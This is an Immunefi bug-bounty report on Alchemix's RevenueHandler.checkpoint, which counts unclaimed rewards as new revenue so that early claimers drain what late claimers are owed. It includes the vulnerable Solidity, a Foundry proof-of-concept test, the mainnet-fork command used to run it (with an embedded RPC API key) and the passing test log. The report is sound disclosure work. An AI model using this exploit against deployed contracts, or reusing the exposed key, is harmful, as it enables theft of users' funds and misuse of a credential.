---
tags:
  - lang/solidity
  - sector/governance
  - sector/lending
  - platform/immunefi
  - has/github
  - has/poc
  - severity/high
  - vuln/logic/reward-calculation
  - novelty/variant
  - misassumption/math-is-safe
  - fix/fix-arithmetic
protocol: "[[Alchemix]]"
auditors:
  - "[[yttriumzz]]"
genome:
  - "[[reward-calculation]]"
  - "[[variant]]"
  - "[[direct-drain]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# `RevenueHandler.checkpoint` counts unclaimed rewards as new rewards causing reduced rewards for users who have not claimed rewards in time

- id: 38176
- impact: HIGH
- protocol: [[Alchemix]]
- reporter: yttriumzz (Immunefi)
- source: N/A

## Summary

This bug report is regarding a vulnerability found in the Smart Contract code for Alchemix Finance. The vulnerability allows for the theft of unclaimed yield by including it in the rewards for the new epoch. This is due to a coding error in the `RevenueHandler.checkpoint` function which uses the total balance of the reward token, including unclaimed rewards, to calculate the reward for the new epoch. This means that some users will receive more rewards than they should, while others will receive less. A suggested fix for this issue is to record the balance as a reward instead of using the entire balance directly. A proof of concept has been provided to demonstrate the vulnerability and its impact. 

## Details

Report type: Smart Contract


Target: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol

Impacts:
- Theft of unclaimed yield

## Description
## Brief/Intro

Anyone calls `RevenueHandler.checkpoint` to update the reward for the current epoch. `checkpoint` will calculate the reward based on the reward token balance of the contract. However, these balances include unclaimed rewards. In other words, the unclaimed rewards of some users are included in the rewards of the new epoch.

## Vulnerability Details

Please look at the following code. When `tokenConfig.poolAdapter` is not set, `thisBalance` is directly used as the reward for the new epoch.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/RevenueHandler.sol#L245-L264
                uint256 thisBalance = IERC20(token).balanceOf(address(this));

                // If poolAdapter is set, the revenue token is an alchemic-token
                if (tokenConfig.poolAdapter != address(0)) {
                    // Treasury only receives revenue if the token is an alchemic-token
                    treasuryAmt = (thisBalance * treasuryPct) / BPS;
                    IERC20(token).safeTransfer(treasury, treasuryAmt);

                    // Only melt if there is an alchemic-token to melt to
                    amountReceived = _melt(token);

                    // Update amount of alchemic-token revenue received for this epoch
                    epochRevenues[currentEpoch][tokenConfig.debtToken] += amountReceived;
                } else {
                    // If the revenue token doesn't have a poolAdapter, it is not an alchemic-token
                    amountReceived = thisBalance;

                    // Update amount of non-alchemic-token revenue received for this epoch
                    epochRevenues[currentEpoch][token] += amountReceived;
                }
```

**Suggested fix**

Record the balance as a reward instead of using all the balance directly

## Impact Details

Users who claim rewards every epoch will receive more rewards, and other users will receive less rewards

## References

None

## Proof of concept
The PoC patch

```diff
diff --git a/src/test/RevenueHandler.t.sol b/src/test/RevenueHandler.t.sol
index 7908478..fd9cbe6 100644
--- a/src/test/RevenueHandler.t.sol
+++ b/src/test/RevenueHandler.t.sol
@@ -644,4 +644,58 @@ contract RevenueHandlerTest is BaseTest {
         revenueHandler.setTreasury(admin);
         assertEq(revenueHandler.treasury(), admin, "treasury should be admin");
     }
+
+    function testYttriumzzPocTemp() external {
+        // 1. init test env
+        deal(bal, address(this), 10000e18);
+        veALCX.checkpoint();
+
+        address user1 = address(0xacc1);
+        address user2 = address(0xacc2);
+        deal(bpt, user1, 1e18);
+        deal(bpt, user2, 1e18);
+
+        // 2. user1 and user2 mint $veToken with 1e18 BPT
+        hevm.startPrank(user1);
+        IERC20(bpt).approve(address(veALCX), 1e18);
+        uint256 tokenId1 = veALCX.createLock(1e18, 0, true);
+        hevm.stopPrank();
+
+        hevm.startPrank(user2);
+        IERC20(bpt).approve(address(veALCX), 1e18);
+        uint256 tokenId2 = veALCX.createLock(1e18, 0, true);
+        hevm.stopPrank();
+
+        vm.warp(block.timestamp + 2 weeks);
+        veALCX.checkpoint();
+
+        // 3. checkpoint 1, user1 claim the rewards
+        IERC20(bal).transfer(address(revenueHandler), 100e18);
+        revenueHandler.checkpoint();
+        vm.warp(block.timestamp + 2 weeks);
+
+        hevm.startPrank(user1);
+        revenueHandler.claim(tokenId1, bal, address(0), revenueHandler.claimable(tokenId1, bal), user1);
+        hevm.stopPrank();
+
+        // 4. checkpoint 2, user1 and user2 claim the rewards, user2 claim revert
+        IERC20(bal).transfer(address(revenueHandler), 100e18);
+        revenueHandler.checkpoint();
+        vm.warp(block.timestamp + 2 weeks);
+
+        hevm.startPrank(user1);
+        revenueHandler.claim(tokenId1, bal, address(0), revenueHandler.claimable(tokenId1, bal), user1);
+        hevm.stopPrank();
+
+        hevm.startPrank(user2);
+        uint256 toClaimable = revenueHandler.claimable(tokenId2, bal);
+        hevm.expectRevert("Not enough revenue to claim");
+        revenueHandler.claim(tokenId2, bal, address(0), toClaimable, user2);
+        console.log("claimable of user2 is %s, but revert", toClaimable);
+        hevm.stopPrank();
+
+        console.log("IERC20(bal).balanceOf(user1): %s", IERC20(bal).balanceOf(user1));
+        console.log("IERC20(bal).balanceOf(user2): %s", IERC20(bal).balanceOf(user2));
+        console.log("IERC20(bal).balanceOf(address(revenueHandler)): %s", IERC20(bal).balanceOf(address(revenueHandler)));
+    }
 }
```

Run the PoC

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
```

The log

```bash
$ FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/RevenueHandler.t.sol:RevenueHandlerTest
[PASS] testYttriumzzPocTemp() (gas: 3021917)
Logs:
  claimable of user2 is 125000000000000000000, but revert
  IERC20(bal).balanceOf(user1): 125000000000000000000
  IERC20(bal).balanceOf(user2): 0
  IERC20(bal).balanceOf(address(revenueHandler)): 75000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 35.59ms (19.80ms CPU time)

Ran 1 test suite in 1.81s (35.59ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
